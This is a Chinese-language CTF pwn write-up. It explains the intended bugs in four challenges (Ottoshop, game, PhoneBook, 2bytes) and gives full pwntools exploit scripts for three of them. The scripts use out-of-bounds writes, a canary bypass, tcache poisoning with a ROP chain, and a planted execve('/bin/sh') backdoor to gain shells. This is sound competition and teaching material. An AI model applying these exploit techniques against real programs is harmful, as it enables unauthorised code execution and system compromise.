## Ottoshop ♿

最开始的想法是想些办法做一个迁移 + 绕 canary , 但是实际上做起来发现好像思考成本有点过高了, 想这么结合做个签到题也不现实, 于是我想了想, 把迁移这个点丢了吧, 换了一个更简单的下标越界.

但是下标越界高低得有个载体, 然后就不知道怎么想到的写个菜单的形式了.

于是我把洞按照菜单的逻辑放在了 2 个地方, 一个是在购买的时候检查不严密, 写负数下标即可低地址修改全局变量, 修改 money 这个值, 一个是输入 666 之后会开放购买 golden ♿ , 这里面会允许溢出, 但是开了 canary , scanf输入正负号绕过即可修改返回地址.

那这样大体逻辑就差不多了, 但是只放这么一点东西是不是又有点过于签到了呢 😄

于是开始塞 shit , 大概塞了这么几个 shit :

+ 写了一堆狗屎函数, 大概是 100 个, 其中夹杂了一个真的后门函数, 目的就是不让你轻易找到那个后门（

+ 后门函数是 `execve("/bin/sh")` , 但是我又不能让你直接在 got 表里面看到后门, 于是改成内联汇编的形式, 采用系统调用的形式来做后门, 然后为了防止找到 `/bin/sh` 👴还加了个异或加密, 源码大概长这样:

  ```c
  void o77oOtTo0T70()
  {
      char *a = flag2;
      if (strcmp(a, "otto") == 0) {
          for(int i = 0;flag1[i];i++)
              flag1[i]^=0xff;
          asm volatile(
              "mov %rsi,0\n"
              "mov %rdx,0\n"
              "lea %rax,flag1\n"
              "mov %rdi,%rax\n"
              "mov %rax,59\n"
              "syscall\n"
          );
      }
  }
  ```

+ 然后还在 666 的那个分支那里放了个假的后门, 一个溢出, 但是不给你 canary 估计你也没得用 😄

于是一个塞了 shit 的签到题就出来了, 考点就是 scanf 的 trick 和下标越界.

---

说下做法, 找后门函数这一块我的预期是你要是有办法就快速找一下, 比如说你可以 CTRL + s 去 data 段里面能看到个 flag1 , 然后交叉引用一下立马就能找到后门函数, 如果你没这样也无所谓, 就 100 个垃圾函数, 翻就完了（

找到后门看到个 execve 的系统调用, 调一下就知道是 shell , 然后如我上面所说, 下标改 money 改 otto , 然后进到 666 分支, 再转回 golden 直接覆盖返回地址即可.

exp:

```py
from pwn import *
#from LibcSearcher import *
context(arch='amd64',os='linux')
#context(log_level='debug')
#r=process("./ottoshop")
r=remote("0.0.0.0",58496)
elf=ELF("./ottoshop")
#libc=ELF("./libc-2.27.so")

def debug():
    gdb.attach(r)
    pause()
#debug()
bkdoor = 0x4020a4

def buy(idx,name):
    r.sendline("1")
    sleep(0.1)
    r.sendlineafter("?\n",str(idx).encode())
    sleep(0.1)
    r.sendafter("name!\n",name)
    sleep(0.1)


buy(-72, b'otto')

buy(-90, b'AAAA')

r.sendline("666")
r.sendline("a")
r.sendline("3")

r.sendlineafter("buy?",'4')
r.sendline("-")
sleep(0.1)
r.sendline("-")
sleep(0.1)
r.sendline("-")
sleep(0.1)

#debug()

r.sendline(str(bkdoor).encode())

r.interactive()
```

## game

一道数字华容道的题目，把一个正常的游戏改了一下，上下移动没有边界，为了人性化一点，给了个backdoor。（还可以出revenge，不过没必要，也就只是增加工作量

### 思路分析

由于移动次数有限，因此需要先利用越界将移动次数改大。然后就可以在栈里面随便修改了，目标就是把返回地址修改为backdoor地址，可以只修改返回地址的两个字节来1/16爆破，backdoor的尾部两个字节可以提前写入在name中。canary绕过就只需要往下移动修改完返回地址之后，再往上移动复位即可。

同时，数字华容道可以在网上找到自动解法，给定初始状态，即可获得解法。（手动玩也可以
[数字华容道 (dpxx.github.io)](https://dpxx.github.io/)

### exp

```python
from pwn import*
#context.log_level = 'debug'

def pwn():
    global io
    #io = remote('localhost', 46523)
    io = process('./game')

    #attach(io)
    #pause()

    #name
    io.sendline(p16(0x9cd8)*10)
    #enter
    io.sendline()
    io.sendline()
    #modify maxTry to bigger
    io.send(b'aawwwwwasssss')
    io.send(b'ssddd')
    #then pos is in (5, 3)

    '''
    |     |    |    | pos|
    ----------------------
    |     canary[0:4]    |
    ----------------------
    |     canary[4:8]    |
    ----------------------
    |      rbp[0:4]      |
    ----------------------
    |      rbp[4:8]      |
    ----------------------
    |      ret[0:4]      |
    ----------------------
    |      ret[4:8]      |
    ----------------------
    | D8  | 9C | D8 | 9C |
    '''
    io.send(b'sssssssa')
    io.send(b'wawasdsawdwasdsawdwasdds')
    io.send(b'dwwwwwww')

    io.send(b'ad'*(577//2)+b'a')
    io.recvuntil(b'Move remaining : 0')
    io.recvuntil(b'--------------------------\n')
    io.recvuntil(b'--------------------------\n')
    #io.interactive()

while 1:
    try:
        pwn()
        io.recv(timeout=0.1)
        io.sendline(b'ls')
        io.interactive()
        break
    except:
        io.close()
```

## PhoneBook

一道常规菜单堆，为了显得不那么烂大街，整成固定大小和单链表的形式，可以越界写入到指针，灵活性相对较大。

预期解法为先泄露堆地址，libc地址，然后通过`environ`泄露栈地址，`tcache poison`打栈即可，`name`和`phone_number`正好是0x18字节，正好可以`p64(pop_rdi)+p64(bin_sh)+p64(system)`，因为栈对齐的问题，`system`的地址需要做调整。（打IO也可，不过会更麻烦

直接看exp吧

```python
from pwn import*
context.log_level = 'debug'

#io = remote('localhost', 41355)
io = process('./PhoneBook')
elf = ELF('./PhoneBook')
libc = elf.libc

def DEBUG():
    attach(io)
    pause()

def menu(choice):
    io.recvuntil(b'Your Choice: \n')
    io.sendline(str(choice).encode())

def add(name, num):
    menu(1)
    io.recvuntil(b'Name?\n')
    io.send(name)
    io.recvuntil(b'Phone Number?\n')
    io.send(num)

def dele(index):
    menu(2)
    io.recvuntil(b'Index?\n')
    io.sendline(str(index).encode())

def show():
    menu(3)

def edit(index, name, num):
    menu(4)
    io.recvuntil(b'Index?\n')
    io.sendline(str(index).encode())
    io.recvuntil(b'Name?\n')
    io.send(name)
    io.recvuntil(b'Phone Number?\n')
    io.send(num)

#泄露堆地址
add(b'A', b'0')     # 1
add(b'A', b'1'*8)   # 2
add(b'A', b'0')     # 3
show()

io.recvuntil(b'1'*8)
heapbase = u64(io.recv(6).ljust(8, b'\x00'))-0x330
log.success('heapbase ===> '+hex(heapbase))

#构造出大堆块，利用溢出指向伪造堆块并释放
for i in range(30):
    add(b'A', b'0')     # 4 - 0x33
edit(4, p64(0x4a1)+p64(4), b'0')
edit(3, b'A', b'0'*8+b'\x70')
dele(4)

#指向伪造堆块，泄露得到libc地址
edit(2, b'A', b'0'*8+b'\x68')
show()

io.recvuntil(b'1185    ')
libcbase = u64(io.recv(6).ljust(8, b'\x00'))-0x219ce0
log.success('libcbase ===> '+hex(libcbase))
environ = libcbase + libc.symbols['environ']
sys = libcbase + libc.symbols['system']
bin_sh = libcbase + next(libc.search(b'/bin/sh\x00'))
pop_rdi = libcbase + 0x2a3e5

#将environ区域链入链表，打印出栈地址
edit(1, b'A', p64(environ-0x18))
edit(2, b'A', b'0'*8+p16((heapbase&0xffff)+0x2c8))
show()

io.recvuntil(b'0                       ')
stack = u64(io.recv(6).ljust(8, b'\x00'))-0x148
log.success('stack ===> '+hex(stack))

#tcache poison 打栈
edit(2, b'A', b'0'*8+p16((heapbase&0xffff)+0x3f0))
dele(7)
dele(8)

edit(2, b'A', b'0'*8+p16((heapbase&0xffff)+0x418))
pos = heapbase + 0x420
fd = (stack) ^ (pos>>12)
edit(0x31, p64(fd), b'A')

edit(2, b'A', b'0'*8+p16((heapbase&0xffff)+0x810))
add(b'A', b'A')     #0x34
add(p64(pop_rdi)+p64(bin_sh)[:7], p64(sys-0x470+2)) #0x35

#DEBUG()

io.interactive()
```

## 2bytes

溢出覆盖 password 绕过检查，同时写 shellcode。shellcode 之能写 7 字节，并且从第 5 个字节开始执行。

使用 `jmp` 指令跳转到 shellcode 开始部分，还剩 5 字节可用。

调试观察寄存器，可以发现 `rax = 0`, `rdi = 0`, `rsi = 0x1000`, `rdx` 是 shellcode 结束地址。对着程序看能发现这些寄存器都是在程序里赋值的，和 libc 版本无关。

使用 `xchg` 指令将 `rdx` 和 `rsi` 交换，使得 `rsi` 指向 shellcode 结束地址，`rdx = 0x1000`，然后 `syscall` 就正好可以读入更多的 shellcode 了。
